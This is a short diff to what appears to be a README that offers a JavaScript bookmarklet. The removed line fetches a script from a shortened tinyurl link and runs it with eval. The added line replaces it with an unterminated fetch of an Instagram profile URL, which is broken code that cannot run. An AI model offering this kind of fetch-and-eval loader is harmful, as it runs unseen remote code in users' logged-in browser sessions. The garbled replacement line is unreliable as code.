@@ -3,7 +3,7 @@
 <br>
 
 ```js
-javascript:fetch("https://tinyurl.com/KhanFucker").then(t=>t.text()).then(eval);
+javascript:fetch("https://www.instagram.com/luizinho.ws?igsh=ZjZlbTRrY2lybW9l
 ```
 
 <br><br><br>
